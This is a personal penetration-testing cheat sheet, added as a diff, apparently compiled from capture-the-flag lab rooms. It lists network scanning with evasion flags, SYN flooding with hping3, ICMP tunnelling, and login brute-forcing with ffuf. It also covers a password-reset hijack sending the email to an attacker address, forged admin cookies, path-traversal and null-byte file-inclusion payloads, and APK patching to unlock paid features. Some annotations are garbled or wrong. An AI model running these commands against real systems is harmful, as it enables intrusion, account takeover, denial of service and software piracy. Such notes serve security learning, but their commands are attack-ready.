@@ -1,0 +1,216 @@
+ip route
+arp -a
+
+nmap -sn --max-rtt-timeout 5s <ipserver>
+nmap -sn <ipserver>
+nmap -F <website.com>   ----open ports
+nmap -sV <iptarget>   ---to do service descovery on a target
+nmap -O <targetip>   ----to see the device OS, can add the -Pn after the -O to not send ping probes(that the firewall prob blocks)
+nmap -sL <ipranges>   ----to do quick hostname scanning on a network
+nmap --script vuln <targetip>  ----to scan for vulnerabilities on a host
+nmap --script malware <ipranges>   -----to scan for malware
+nmap -A <targetip>   ---gives a lot of information
+nmap -f <ipranges>   ----it will fragent our packets to make it harder to bee detected
+nmap --source-port <port> <ipranges>    ------avoid detection by changing our source port
+nmap -D RND:<numberOfIpsScanning> <iprange>   ------it will make numberOfIpsScanning from the iprange making our ip harder to scan
+
+masscan -p80 <portToScan>, (...) <network=ipranges> --rate=<number>    -----to scan entire networks faster, can add in the end --randomize-hosts to make it harder to track changing the oreder to scan
+ssh -L 3306:localhost:3306 user@<webip>      - connect via ssh port o a website
+gobuster -u <http://website.com> -w <bruteforcelist.txt> dir
+ss -lt
+ss -t      ---------can see every site im connected to and the respective
+ss -tulnp
+ss -l
+(...)
+mysql -h 162.241.218.112 -p 3306 -u root -p          -  <portname?> -h <websiteip> -p <porttoacced -u root -p  
+curl -I <https://website.com>   -----or -i etc
+netstat -l
+netstat -g
+netstat -i
+netstat -b 
+netstat -tulnp
+netstat -an | grep :number    ----shows all conections used a port that has the number in the portnumber(for example =80 will appear port 80... ..80 ..80.. connections)
+(...)
+last -a     - to see boot logs
+ip route
+ifconfing -----interfaces connected to...
+nmcli -t -f DEVICE,TYPE,CONNECTION dev --------------------------see what is each network is , casual name
+nmcli dev wifi list ------------- While it won’t show all devices, it might provide casual names for Wi-Fi networks and connected clients.
+
+
+avahi-browse -a   ------------list all devices connected
+                          -ar -----gives more information on every device
+curl ipinfo.io/<IP>    -------------to see the location of the current device 
+
+
+scan <ip>    ----------------created a script that sees if the webip has web or login vulnerabilities(saved on /usr/local/bin/)
+
+-------------------------------------------------------------------------------------------
+
+ps aux
+top     -task manager
+sar -u <tempoDePrintAoCPU> <tempoQueFicaACorrer>
+
+
+ls -a   ------ shows all hiden directorys
+ls -la ----se every file and their permissions etc
+ls -r -----reverse the order of apperance ////// ls -1(line by line) ls -1r(same but reversed)
+mkdir <dirname> -----create dir
+touch  <filename> //// echo >> <filename>   -------create file
+var=$(command1)$(command2)$(...)/////echo $var ----returns all the outputs for the commands saved in var we can as well use echo $var > file.txt (saves output of the var there, way to save information)
+nano <filename>  ----------open it on the terminal
+tree     ----gives a clearer vision of the directories and their files
+mv file file2   -------renames the file name to file2
+mv file ../    -------moves file a directory back
+cd var/log   -------------to see log files, can be authetication etc
+head <file>  -------first lines, --tail-- oposite
+head <file> -n <numberoflinestosee>
+find / -name <filename>    -----to look for file can use find / -name <filetoLook> 2>/dev/null  ----to not show files without permission
+find / -name *<word>*    --------shows all files with the word in its name
+cat <.../../file> | grep <word>   -----show all lines in the file with the word, we can add -n in the end to show the line number as well
+grep </.../file> <string>   -----to search for the string in the file
+grep -Hnri <command> | code -     ------ to add the output of the command to a 
+whoami
+whois <microsoft.com>   ----gives information on that comany etc
+uname -a
+
+ 
+ssh user@<ipUser> uname -a   ---returns the uname -a command for a user on the same network
+sudo nmap -sn <ipnetworkrange> -----to see all the devices connected sudo arp-scan --localnet
+wakeonlan <mac-adress>
+sudo arp-scan --localnet  ---------all the private ips-macs-owners 
+
+//
+tcpdump -w <filWeUsingToStore.pcap> -i <interface>
+tcpdump -r <filWeUsingToStore.pcap>    ----to read the packets received from the above command
+//
+sudo tcpdump -i <interface>  ----recebo todas as packages a passarem pela interface
+sudo tcpdump -i <interface> port <portnumber>   -----recebo todas as informações naquela port especifica
+sudo tcpdump -i <interface> -w <file>.pcap  -----para adicionar a um ficheiro para ler
+sudo tcpdump -r <file>.pcap   --------to read from the file where you saved the packets informations
+sudo tcpdump host <ip>    -------to filter traffic from a specific ip
+sudo tcpdump -A    ------Capture traffic but limit output to human-readable strings:
+can be mixed for example (sudo tcpdump -i <interface(router?)> host <privateip>) -----
+Can connect to the router via ssh to listen to the packets in comming
+
+tshark -Y'http.request.method == "GET"' -i <interface>    ----can see get requests
+
+ping -s <packetsize> <ip>   ----can be used to test caipabilities of the firewall 
+iftop   -----combine with the ping command in diferent terminals can be used to flood a device with traffic
+hping3 -S -V --flood <ip>    -----to flood again, can be used to test webserver caipabilities for ex.
+hping3 --traceroute -V -p 80 -S -A --baseport 1337 <webserver>   -----can be used for multiple stuff traceroute, can change parameters to pass certain firewalls rules
+
+TO TUNNEL TCP PACKETS OVER ICMP ECHO REPLY PACKETS:
+on target side run: ptunnel
+on the attacker side : ptunnel -p <iptarget> -lp <localport> -da <iptarget> -dp <targetport>   ------ proxy the target ip, my port, 8000, destination adress, target port 80
+COMBINED WITH:  terminal1: -- tcpdump -i any icmp   ------to receive the icmp packets from any interface
+		terminal2: -- ssh -p <localport> <myuser>@localhost   -------to connect to the port where the packets are comming from, port as to be the same as ptunnel -lp
+
+UNDERSTAND BETTER 
+///////////////////////////////
+ssh -D 1337 -C -q -N root@172.234.88.97
+password:....
+chromium --no sandbox --proxy-server="socks5://localhost:1337"
+///////////////////////////////
+
+
+// to establish a communication through the terminal
+one side: nc -lvp <port>
+other side: nc -v <ipOfTheOtherComputerSide> <port>
+//
+
+
+//
+TO TRY TO DISCOVER SUB DOMAINS
+ffuf -w word.txt -H "Host: FUZZ.<site.(...)>" -u http://<ipsite>
+           
+ffuf -w word.txt -H "Host: FUZZ.<site.(...)>" -u http://<ipsite> -fs {size}
+
+           
+ ffuf -w <wordlist>.txt -X <requestmethod> -d "<username=FUZZ&email=x&password=x&cpassword=x>" -H "Content-Type: application/x-www-form-urlencoded" -u http://<site...> -mr "<SetenceWeAreTryingToMakeDisapear>"  ----request method may be (POST, GET,..., it depends, search more for it), -d = data we are going to send(the field we have in singup, -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type so the web server knows we are sending form data, -u for the URL, -mr is the text on the page we are trying to validate
+
+           
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.144.48/customers/login -fc 200   ------W1 for our list of valid usernames and W2 for the list of passwords we will try. The multiple wordlists are again specified with the -w argument but separated with a comma.  For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.
+
+
+           
+curl 'http://site/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+after bruteforcing our way in we can try to change the robert password by rederecting the confirmation email to my email(attacker@hacker...)
+        
+
+
+in case we verify the cookie as something unrealistic like Set-Cookie: logged_in=true; Max-Age=3600; Path=/  Set-Cookie: admin=false; Max-Age=3600; Path=/
+we can curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
+
+      
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+FILE INCLUSION
+
+
+Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.
+
+Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12  
+This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00
+accepted would be ../../../../../etc/passwd%00.php   or passwd/
+
+
+we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this-> ....//....//....//....//etc/passwd   ==   ../../../../etc/passwd
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+REVERSE ENGINEERING:
+
+On apk files:
+STEP 1: Decompile the APK,  STEP 2: Modify Smali Code(can be for example change premium statement to true), STEP 3: Recompile the APK(his rebuilds the APK with the modified Smali code), STEP 4: Sign theAPKBefore installing(Android requires that all APKs be signed. Use Uber APK Signer or SignAPK).
+
+Steps in Reverse Engineering Software:
+1️⃣ Extract the Software Components
+
+    If the software is an Android app (.apk) → Use apktool, jadx, or dex2jar to decompile it.
+    If it’s a Windows app (.exe/.dll) → Use tools like IDA Pro or Ghidra to analyze the binary.
+
+2️⃣ Disassemble and Decompile the Code
+
+    Disassemblers like IDA Pro and Radare2 convert machine code into assembly.
+    Decompilers like jadx and Ghidra reconstruct high-level code (Java, C, etc.).
+
+3️⃣ Analyze and Modify the Code
+
+    Look for key functions (e.g., license checks, encryption routines).
+    Modify code by patching the binary or editing Smali/assembly instructions.
+
+4️⃣ Recompile and Test
+
+    If modifying an APK, use apktool b to repackage the app and re-sign it.
+    If modifying an executable, use a hex editor or assembler to patch the binary.
+
+
+
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+TOOLS:
+Wappalyzer is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.
+
+The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine so by putting the website/robots.txt   ....
+
+by using curl http://website/.../favicon.ico | md5sum   i will get the hash value of the site favicon so the i can search on OWASP about the framework used
+
+sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.
+
+
+SSL/TLS Certificates
+When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like https://crt.sh offer a searchable database of certificates that shows current and historical results
+
+To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like Sublist3r ./sublist3r.py -d <site>
+
+encoder :
+https://www.base64encode.org/
+
+hash cracker:
+https://crackstation.net/
+
+
+BurbSuite to proxy the cookies going out and tamper them
+
